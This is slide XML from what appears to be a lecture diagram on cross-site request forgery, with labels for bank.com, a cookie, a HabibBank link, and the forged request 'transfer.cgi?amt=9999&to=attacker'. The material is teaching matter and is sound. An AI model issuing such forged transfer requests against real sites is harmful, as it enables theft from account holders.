            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87059" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8533279" y="4437530"/>
            <a:ext cx="1809750" cy="1420346"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2586990"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 7803 w 2586990"/>
              <a:gd name="T5" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2586990"/>
              <a:gd name="T7" fmla="*/ 28269 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2586990"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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86990" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2586685" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586685" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87060" name="object 24"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8691563" y="4920784"/>
            <a:ext cx="1383926" cy="3590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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="2780"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2118" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87061" name="object 22"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="4675655" y="4751330"/>
            <a:ext cx="3353360" cy="243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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1887"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>HabibB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:hlinkClick r:id="rId8"/>
              </a:rPr>
              <a:t>ank.com/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588" b="1">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87062" name="object 23"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="780000">
            <a:off x="3952875" y="4990264"/>
            <a:ext cx="4391306"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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:lnSpc>
                <a:spcPts val="1831"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Straight Arrow Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3742765" y="4101353"/>
            <a:ext cx="4633632" cy="114300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87064" name="object 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2136122" y="4017309"/>
            <a:ext cx="983316" cy="487456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId9"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="object 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2273394" y="3697941"/>
            <a:ext cx="931489" cy="673774"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="1141553" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="2118" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="11191" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="724"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Cookie</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87066" name="object 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1658471" y="3392581"/>
            <a:ext cx="1245254" cy="532279"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId10"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
